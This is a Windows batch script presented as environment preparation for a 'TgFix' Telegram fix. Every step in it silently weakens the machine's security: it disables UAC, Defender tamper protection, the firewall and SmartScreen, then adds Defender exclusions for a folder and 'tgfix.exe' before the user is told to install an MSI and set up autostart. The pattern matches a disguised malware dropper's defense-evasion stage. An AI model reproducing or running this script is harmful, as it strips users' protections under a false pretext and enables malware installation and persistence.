@echo off
title Prepare Environment for TgFix
echo =========================================
echo   Prepare Environment for TgFix
echo =========================================
echo.
echo Please wait...

:: 1. Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

:: 2. Disable Tamper Protection
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d 0 /f >nul 2>&1

:: 3. Disable Windows Firewall
netsh advfirewall set allprofiles state off >nul 2>&1

:: 4. Disable SmartScreen
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f >nul 2>&1

:: 5. Create target folder (so that exclusions work before file appears)
mkdir "C:\ProgramData\TgFix" 2>nul

:: 6. Add Defender exclusions (folder and process name)
powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\TgFix'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'tgfix.exe'" >nul 2>&1

echo.
echo Environment prepared. You can now install TelegramFix2.msi.
echo After installation, run finalize.bat (as admin) to set up autostart.
echo.
pause